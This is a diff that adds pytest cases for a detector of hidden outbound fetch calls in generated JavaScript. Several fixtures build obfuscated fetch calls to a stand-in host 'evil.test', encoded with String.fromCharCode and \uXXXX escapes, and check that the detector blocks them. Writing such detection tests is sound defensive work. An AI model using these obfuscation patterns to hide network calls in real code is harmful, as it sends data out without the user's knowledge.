@@ -624,6 +624,86 @@ def test_reverse_decl_without_reverse_call_passes():
     assert check_outbound_exfil(content, "App.tsx") is None
 
 
+# --- QA-3 Fire 117 note variants: fromCharCode + \\uXXXX --------------------
+
+
+def _char_codes(s: str) -> str:
+    return ", ".join(str(ord(c)) for c in s)
+
+
+def _hex_codes(s: str) -> str:
+    return ", ".join(f"0x{ord(c):02x}" for c in s)
+
+
+def _u_escapes(s: str) -> str:
+    return "".join(f"\\u{ord(c):04x}" for c in s)
+
+
+def test_fromCharCode_decimal_blocks():
+    content = (
+        f'const url = String.fromCharCode({_char_codes("https://evil.test/x")});\n'
+        f'fetch(url);\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "evil.test" in err
+
+
+def test_fromCharCode_hex_blocks():
+    content = (
+        f'fetch(String.fromCharCode({_hex_codes("https://evil.test/x")}));\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+
+
+def test_fromCharCode_localhost_passes():
+    content = (
+        f'fetch(String.fromCharCode({_char_codes("http://localhost:3000/api")}));\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_fromCharCode_non_url_passes():
+    """Legit: reconstructing the word 'hello' is not a URL."""
+    content = f'const greet = String.fromCharCode({_char_codes("hello")});'
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_fromCharCode_arithmetic_arg_passes():
+    """Regression: arithmetic / variable args skip scan (can't evaluate)."""
+    content = "const x = String.fromCharCode(a + b, c * 2);"
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_unicode_escape_url_blocks():
+    content = (
+        f'const url = "{_u_escapes("https://evil.test/x")}";\n'
+        f'fetch(url);\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "evil.test" in err
+
+
+def test_unicode_escape_localhost_passes():
+    content = f'fetch("{_u_escapes("http://localhost:3000/x")}");'
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_unicode_escape_i18n_passes():
+    """Regression: legit i18n strings with \\uXXXX escapes (Japanese greeting)
+    must not false-positive — they don't decode to URL-shaped strings."""
+    content = 'const greet = "\\u3053\\u3093\\u306b\\u3061\\u306f";  // konnichiwa'
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_unicode_escape_too_few_sequences_passes():
+    """Threshold: fewer than 3 \\uXXXX in a literal → not considered obfuscation."""
+    content = 'const s = "a\\u0062c";'  # only 1 escape
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
 def test_filewrite_clean_counter_passes():
     """Sanity: a benign counter still writes fine."""
     with tempfile.TemporaryDirectory() as tmp:
